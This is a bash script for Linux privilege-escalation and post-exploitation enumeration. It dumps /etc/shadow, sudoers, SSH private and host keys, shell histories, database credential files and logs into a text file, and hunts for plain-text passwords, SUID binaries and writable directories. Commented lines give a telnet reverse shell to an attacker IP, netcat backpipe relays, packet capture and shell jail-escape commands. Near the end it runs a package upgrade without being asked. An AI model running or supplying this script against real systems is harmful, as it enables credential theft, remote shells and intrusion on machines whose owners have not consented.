#!/bin/bash

#######################################
# Run the below each, as they're interactive and will break script
#######################################
# python -c 'import pty;pty.spawn("/bin/bash")'
# echo os.system('/bin/bash')
# /bin/sh -i
# sudo -l
#######################################




output_file="Untitled-G0tmi1k.txt"

# Define a function to execute commands and append to the output file
execute_and_append() {
  echo "$1" >> "$output_file"
  eval "$1" >> "$output_file" 2>/dev/null
}

# Clear the output file if it exists
> "$output_file"

# Operating System
printf " ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ System Operating ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ \n\n"| tee -a "$output_file"

# Distrubution type
printf "What's the distribution type? What version?\n"| tee -a "$output_file"
execute_and_append "cat /etc/issue"
execute_and_append "cat /etc/*-release"
execute_and_append "cat /etc/lsb-release"
execute_and_append "cat /etc/redhat-release"
printf "\n%.0s" {1..5} >> "$output_file"

# Kernel version
printf "What's the kernel version? Is it 64-bit?\n"| tee -a "$output_file"
execute_and_append "cat /proc/version"
execute_and_append "uname -a"
execute_and_append "uname -mrs"
execute_and_append "rpm -q kernel"
execute_and_append "dmesg | grep Linux"
execute_and_append "ls /boot | grep vmlinuz-"
printf "\n%.0s" {1..5} >> "$output_file"

# Environmental variables
printf "Environmental variables\n"| tee -a "$output_file"
execute_and_append "cat /etc/profile"
execute_and_append "cat /etc/bashrc"
execute_and_append "cat ~/.bash_profile"
execute_and_append "cat ~/.bashrc"
execute_and_append "cat ~/.bash_logout"
execute_and_append "env"
execute_and_append "set"
printf "\n%.0s" {1..5} >> "$output_file"

# Printer
printf "Printer\n"| tee -a "$output_file"
execute_and_append "lpstat -a"







printf "\n%.0s" {1..15} >> "$output_file"
# Applications & Services
printf " ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ Applications & Services ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ \n\n"| tee -a "$output_file"

# Services Running
printf "Services Running\n"| tee -a "$output_file"
execute_and_append "ps aux"
execute_and_append "ps -ef"
execute_and_append "top -n 1"
execute_and_append "cat /etc/services"
printf "\n%.0s" {1..5} >> "$output_file"

# Services Running
printf "Services Running root\n"| tee -a "$output_file"
execute_and_append "ps aux | grep root"
execute_and_append "ps -ef | grep root"
printf "\n%.0s" {1..5} >> "$output_file"

# Services Running
printf "Apps installed, version, running?\n"| tee -a "$output_file"
execute_and_append "ls -alh /usr/bin/"
execute_and_append "ls -alh /sbin/"
execute_and_append "dpkg -l"
execute_and_append "rpm -qa"
execute_and_append "ls -alh /var/cache/apt/archivesO"
execute_and_append "ls -alh /var/cache/yum/"
printf "\n%.0s" {1..5} >> "$output_file"

# Misconfigured services 
printf "Misconfigured services\n"| tee -a "$output_file"
execute_and_append "cat /etc/syslog.conf"
execute_and_append "cat /etc/chttp.conf"
execute_and_append "cat /etc/lighttpd.conf"
execute_and_append "cat /etc/cups/cupsd.conf"
execute_and_append "cat /etc/inetd.conf"
execute_and_append "cat /etc/apache2/apache2.conf"
execute_and_append "cat /etc/my.conf"
execute_and_append "cat /etc/httpd/conf/httpd.conf"
execute_and_append "cat /opt/lampp/etc/httpd.conf"
execute_and_append "ls -aRl /etc/ | awk '$1 ~ /^.*r.*/'"
printf "\n%.0s" {1..5} >> "$output_file"

# Jobs scheduled
printf "Jobs scheduled\n"| tee -a "$output_file"
execute_and_append "crontab -l"
execute_and_append "ls -alh /var/spool/cron"
execute_and_append "ls -al /etc/ | grep cron"
execute_and_append "ls -al /etc/cron*"
execute_and_append "cat /etc/cron*"
execute_and_append "cat /etc/at.allow"
execute_and_append "cat /etc/at.deny"
execute_and_append "cat /etc/cron.allow"
execute_and_append "cat /etc/cron.deny"
execute_and_append "cat /etc/crontab"
execute_and_append "cat /etc/anacrontab"
execute_and_append "cat /var/spool/cron/crontabs/root"
printf "\n%.0s" {1..5} >> "$output_file"

# Plain text user/pass
printf "Plain text user/pass\n"| tee -a "$output_file"
execute_and_append "grep -i user [filename]"
execute_and_append "grep -i pass [filename]"
execute_and_append 'grep -C 5 "password" [filename]'
execute_and_append 'find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"'










printf "\n%.0s" {1..15} >> "$output_file"
# Applications & Services
printf " ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ Communication and Networking ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ \n\n"| tee -a "$output_file"

# What NIC(s) does the system have? Is it connected to another network?
printf 'NIC(s) on the system. Connected to another network?\n'| tee -a "$output_file"
execute_and_append '/sbin/ifconfig -a'
execute_and_append 'cat /etc/network/interfaces'
execute_and_append 'cat /etc/sysconfig/network'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Network configuration settings -DHCP, DNS, Gateway-\n'| tee -a "$output_file"
execute_and_append 'cat /etc/resolv.conf'
execute_and_append 'cat /etc/sysconfig/network'
execute_and_append 'cat /etc/networks'
execute_and_append 'iptables -L'
execute_and_append 'hostname'
execute_and_append 'dnsdomainname'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'What other users & hosts are communicating with the system?\n'| tee -a "$output_file"
execute_and_append 'lsof -i'
execute_and_append 'lsof -i :80'
execute_and_append 'grep 80 /etc/services'
execute_and_append 'netstat -antup'
execute_and_append 'netstat -antpx'
execute_and_append 'netstat -tulpn'
execute_and_append 'chkconfig --list'
execute_and_append 'chkconfig --list | grep 3:on'
execute_and_append 'last'
execute_and_append 'w'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Whats cached? IP and/or MAC addresses\n'| tee -a "$output_file"
execute_and_append 'arp -e'
execute_and_append 'route'
execute_and_append '/sbin/route -nee'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Is packet sniffing possible? What can be seen? Listen to live traffic\n'| tee -a "$output_file"
execute_and_append 'tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Have you got a shell? Check this comment to interact with the system?\n'| tee -a "$output_file"
# nc -lvp 4444
# nc -lvp 4445
# telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445
printf '\n%.0s' {1..5} >> "$output_file"

# Port Forwarding
printf 'Port forwarding. Redirect and interact with traffic from another view\n'| tee -a "$output_file"
execute_and_append 'FPipe.exe -l 80 -r 80 -s 80 192.168.1.7'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Note on Tunneling: ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]\n'| tee -a "$output_file"
# ssh -L 8080:127.0.0.1:80 root@192.168.1.7
# ssh -R 8080:127.0.0.1:80 root@192.168.1.7
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Note: mknod backpipe p ; nc -l -p [remote port] < backpipe | nc [local IP] [local port] >backpipe\n'| tee -a "$output_file"
# mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe
# mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe
# mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe
printf '\n%.0s' {1..5} >> "$output_file"

# Tunneling
printf 'Tunnelings. Send commands locally, remotely\n'| tee -a "$output_file"
# ssh -D 127.0.0.1:9050 -N [username]@[ip]
# proxychains ifconfig
printf '\n%.0s' {1..5} >> "$output_file"










printf "\n%.0s" {1..15} >> "$output_file"
# Confidential Information & Users
printf " ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ Confidential Information & Users ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ \n\n"| tee -a "$output_file"

# User Info
printf 'Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?\n'| tee -a "$output_file"
execute_and_append 'id'
execute_and_append 'who'
execute_and_append 'w'
execute_and_append 'last'
execute_and_append 'cat /etc/passwd | cut -d: -f1'
execute_and_append "grep -v -E '^#' /etc/passwd | awk -F: '\''$3 == 0 { print $1}'\''"
execute_and_append "awk -F: '\''($3 == "0") {print}'\'' /etc/passwd"
execute_and_append 'cat /etc/sudoers'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'What sensitive files can be found?\n'| tee -a "$output_file"
execute_and_append 'cat /etc/passwd'
execute_and_append 'cat /etc/group'
execute_and_append 'cat /etc/shadow'
execute_and_append 'ls -alh /var/mail/'
printf '\n%.0s' {1..5} >> "$output_file"

printf "Anything 'interesting' in the home directories? If it\'s possible to access\n"| tee -a "$output_file"
execute_and_append 'ls -ahlR /root/'
execute_and_append 'ls -ahlR /home/'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords\n'| tee -a "$output_file"
execute_and_append 'cat /var/apache2/config.inc'
execute_and_append 'cat /var/lib/mysql/mysql/user.MYD'
execute_and_append 'cat /root/anaconda-ks.cfg'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'What has the user been doing? Is there any password in plain text? What have they been editing?\n'| tee -a "$output_file"
execute_and_append 'cat ~/.bash_history'
execute_and_append 'cat ~/.nano_history'
execute_and_append 'cat ~/.atftp_history'
execute_and_append 'cat ~/.mysql_history'
execute_and_append 'cat ~/.php_history'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'User info can be found?\n'| tee -a "$output_file"
execute_and_append 'cat ~/.bashrc'
execute_and_append 'cat ~/.profile'
execute_and_append 'cat /var/mail/root'
execute_and_append 'cat /var/spool/mail/root'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Private-key info\n'| tee -a "$output_file"
execute_and_append 'cat ~/.ssh/authorized_keys'
execute_and_append 'cat ~/.ssh/identity.pub'
execute_and_append 'cat ~/.ssh/identity'
execute_and_append 'cat ~/.ssh/id_rsa.pub'
execute_and_append 'cat ~/.ssh/id_rsa'
execute_and_append 'cat ~/.ssh/id_dsa.pub'
execute_and_append 'cat ~/.ssh/id_dsa'
execute_and_append 'cat /etc/ssh/ssh_config'
execute_and_append 'cat /etc/ssh/sshd_config'
execute_and_append 'cat /etc/ssh/ssh_host_dsa_key.pub'
execute_and_append 'cat /etc/ssh/ssh_host_dsa_key'
execute_and_append 'cat /etc/ssh/ssh_host_rsa_key.pub'
execute_and_append 'cat /etc/ssh/ssh_host_rsa_key'
execute_and_append 'cat /etc/ssh/ssh_host_key.pub'
execute_and_append 'cat /etc/ssh/ssh_host_key'















printf "\n%.0s" {1..15} >> "$output_file"
# File Systems
printf " ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ File Systems ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ \n\n"| tee -a "$output_file"

# Configuration Files

printf 'Which configuration files can be written in /etc/? Able to reconfigure a service?\n'| tee -a "$output_file"
execute_and_append "ls -aRl /etc/ | awk '\''$1 ~ /^.*w.*/'\'' 2>/dev/null"
execute_and_append "ls -aRl /etc/ | awk '\''$1 ~ /^..w/'\'' 2>/dev/null"
execute_and_append "ls -aRl /etc/ | awk '\''$1 ~ /^.....w/'\'' 2>/dev/null"
execute_and_append "ls -aRl /etc/ | awk '\''$1 ~ /w.$/'\'' 2>/dev/null"
execute_and_append 'find /etc/ -readable -type f 2>/dev/null'
execute_and_append 'find /etc/ -readable -type f -maxdepth 1 2>/dev/null'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'What can be found in /var/ ?\n'| tee -a "$output_file"
execute_and_append 'ls -alh /var/log'
execute_and_append 'ls -alh /var/mail'
execute_and_append 'ls -alh /var/spool'
execute_and_append 'ls -alh /var/spool/lpd'
execute_and_append 'ls -alh /var/lib/pgsql'
execute_and_append 'ls -alh /var/lib/mysql'
execute_and_append 'cat /var/lib/dhcp3/dhclient.leases'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Any settings/files (hidden) on website? Any settings file with database information?\n'| tee -a "$output_file"
execute_and_append 'ls -alhR /var/www/'
execute_and_append 'ls -alhR /srv/www/htdocs/'
execute_and_append 'ls -alhR /usr/local/www/apache22/data/'
execute_and_append 'ls -alhR /opt/lampp/htdocs/'
execute_and_append 'ls -alhR /var/www/html/'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Is there anything more in the log file(s)?\n'| tee -a "$output_file"
execute_and_append 'cat /etc/httpd/logs/access_log'
execute_and_append 'cat /etc/httpd/logs/access.log'
execute_and_append 'cat /etc/httpd/logs/error_log'
execute_and_append 'cat /etc/httpd/logs/error.log'
execute_and_append 'cat /var/log/apache2/access_log'
execute_and_append 'cat /var/log/apache2/access.log'
execute_and_append 'cat /var/log/apache2/error_log'
execute_and_append 'cat /var/log/apache2/error.log'
execute_and_append 'cat /var/log/apache/access_log'
execute_and_append 'cat /var/log/apache/access.log'
execute_and_append 'cat /var/log/auth.log'
execute_and_append 'cat /var/log/chttp.log'
execute_and_append 'cat /var/log/cups/error_log'
execute_and_append 'cat /var/log/dpkg.log'
execute_and_append 'cat /var/log/faillog'
execute_and_append 'cat /var/log/httpd/access_log'
execute_and_append 'cat /var/log/httpd/access.log'
execute_and_append 'cat /var/log/httpd/error_log'
execute_and_append 'cat /var/log/httpd/error.log'
execute_and_append 'cat /var/log/lastlog'
execute_and_append 'cat /var/log/lighttpd/access.log'
execute_and_append 'cat /var/log/lighttpd/error.log'
execute_and_append 'cat /var/log/lighttpd/lighttpd.access.log'
execute_and_append 'cat /var/log/lighttpd/lighttpd.error.log'
execute_and_append 'cat /var/log/messages'
execute_and_append 'cat /var/log/secure'
execute_and_append 'cat /var/log/syslog'
execute_and_append 'cat /var/log/wtmp'
execute_and_append 'cat /var/log/xferlog'
execute_and_append 'cat /var/log/yum.log'
execute_and_append 'cat /var/run/utmp'
execute_and_append 'cat /var/webmin/miniserv.log'
execute_and_append 'cat /var/www/logs/access_log'
execute_and_append 'cat /var/www/logs/access.log'
execute_and_append 'ls -alh /var/lib/dhcp3/'
execute_and_append 'ls -alh /var/log/postgresql/'
execute_and_append 'ls -alh /var/log/proftpd/'
execute_and_append 'ls -alh /var/log/samba/'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'If commands are limited, can you break out of the "jail" shell?\n'| tee -a "$output_file"
printf 'Note: see comments at the top for the commands as they do not work in a script; they are more interactive commands.'
# execute_and_append 'python -c '\''import pty;pty.spawn("/bin/bash")'\'''
# execute_and_append "echo os.system('\''/bin/bash'\'')"
# execute_and_append '/bin/sh -i'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'How are file-systems mounted?\n'| tee -a "$output_file"
execute_and_append 'mount'
execute_and_append 'df -h'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Are there any unmounted file-systems?\n'| tee -a "$output_file"
execute_and_append 'cat /etc/fstab'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID\n'| tee -a "$output_file"
execute_and_append 'find / -perm -1000 -type d 2>/dev/null'
printf 'Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.\n'| tee -a "$output_file"
execute_and_append 'find / -perm -1000 -type d 2>/dev/null'
printf 'SGID (chmod 2000) - run as the group, not the user who started it.\n'| tee -a "$output_file"
execute_and_append 'find / -perm -g=s -type f 2>/dev/null'
printf 'SUID (chmod 4000) - run as the owner, not the user who started it.\n'| tee -a "$output_file"
execute_and_append 'find / -perm -u=s -type f 2>/dev/null'
printf 'SGID or SUID\n'| tee -a "$output_file"
execute_and_append 'find / -perm -g=s -o -perm -u=s -type f 2>/dev/null'
printf 'Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)\n'| tee -a "$output_file"
execute_and_append 'for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done'
printf 'find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)\n'| tee -a "$output_file"
execute_and_append 'find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null'
printf '\n%.0s' {1..5} >> "$output_file"

printf 'Where can be written to and executed from? A few "common" places: /tmp, /var/tmp, /dev/shm\n' | tee -a "$output_file"
# world-writeable folders
printf 'world-writeable folders\n'| tee -a "$output_file"
execute_and_append 'find / -writable -type d 2>/dev/null'
printf 'world-writeable folders\n'| tee -a "$output_file"
execute_and_append 'find / -perm -222 -type d 2>/dev/null'
printf 'world-writeable folders\n'| tee -a "$output_file"
execute_and_append 'find / -perm -o w -type d 2>/dev/null'
printf 'world-executable folders\n'| tee -a "$output_file"
execute_and_append 'find / -perm -o x -type d 2>/dev/null'
printf 'world-writeable & executable folders\n'| tee -a "$output_file"
execute_and_append 'find / \( -perm -o w -perm -o x \) -type d 2>/dev/null'
printf '\n%.0s' {1..5} >> "$output_file"

# problem files? World-writeable, "nobody" files
printf 'Any "problem" files? World-writeable, "nobody" files\n'| tee -a "$output_file"
execute_and_append 'find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print'
execute_and_append 'find /dir -xdev \( -nouser -o -nogroup \) -print'
printf '\n%.0s' {1..5} >> "$output_file"











printf "\n%.0s" {1..15} >> "$output_file"
# Preparation & Finding Exploit Code
printf " ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ Preparation & Finding Exploit Code ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ \n\n"| tee -a "$output_file"


#What development tools/languages are installed/supported?
printf "What development tools/languages are installed/supported?\n"| tee -a "$output_file"
execute_and_append "find / -name perl*"
execute_and_append "find / -name python*"
execute_and_append "find / -name gcc*"
execute_and_append "find / -name cc"

# How can files be uploaded?
printf "How can files be uploaded?\n"| tee -a "$output_file"
execute_and_append "find / -name wget"
execute_and_append "find / -name nc*"
execute_and_append "find / -name netcat*"
execute_and_append "find / -name tftp*"
execute_and_append "find / -name ftp"










printf "\n%.0s" {1..15} >> "$output_file"
# Mitigations
printf " ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ Mitigations ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ ~ \n\n"| tee -a "$output_file"

#Is the system fully patched?
printf "Is the system fully patched? Kernel, operating system, all applications, their plugins and web services\n"| tee -a "$output_file"
execute_and_append "apt-get update && apt-get upgrade"
execute_and_append "yum update"

printf "\n\n\n\nEnd of File. Did you get milk?"
